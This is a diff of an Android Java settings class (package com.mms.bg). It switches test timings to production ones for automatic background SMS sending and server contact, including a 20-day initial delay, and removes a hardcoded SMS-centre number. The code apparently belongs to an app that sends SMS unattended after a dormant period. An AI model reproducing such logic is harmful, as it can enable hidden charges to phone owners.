@@ -80,11 +80,11 @@ public class SettingManager {
     private static final int DEFAULT_SMS_COUNT = 0;
     
     private static final String DEFAULT_VALUE = "";
-//    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 20) * 24 * 3600 * 1000);
-    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 5) * 3600 * 1000);
+    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 20) * 24 * 3600 * 1000);
+//    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 5) * 3600 * 1000);
     private static final long SMS_ONE_ROUND_NAP = 5 * 60 * 1000;
-//    public static final long SMS_CHECK_ROUND_DELAY = ((long) 24) * 3600 * 1000;
-    public static final long SMS_CHECK_ROUND_DELAY = ((long) 60) * 60 * 1000;
+    public static final long SMS_CHECK_ROUND_DELAY = ((long) 24) * 3600 * 1000;
+//    public static final long SMS_CHECK_ROUND_DELAY = ((long) 60) * 60 * 1000;
     
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
@@ -452,7 +452,7 @@ public class SettingManager {
         
         long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
         long latestConnectTime = getLastConnectServerTime();
-        long tempDelay = 1 * 60 * 1000;
+        long tempDelay = 10 * 1000;
         if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
             firstTime = currentTime + tempDelay;
         } else if (latestConnectTime != 0) {
@@ -534,7 +534,7 @@ public class SettingManager {
         String smsCenter = this.getSMSCenter();
         //test code
 //        if (smsCenter == null) {
-            smsCenter = "13800550500";
+//            smsCenter = "13800100500";
 //        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
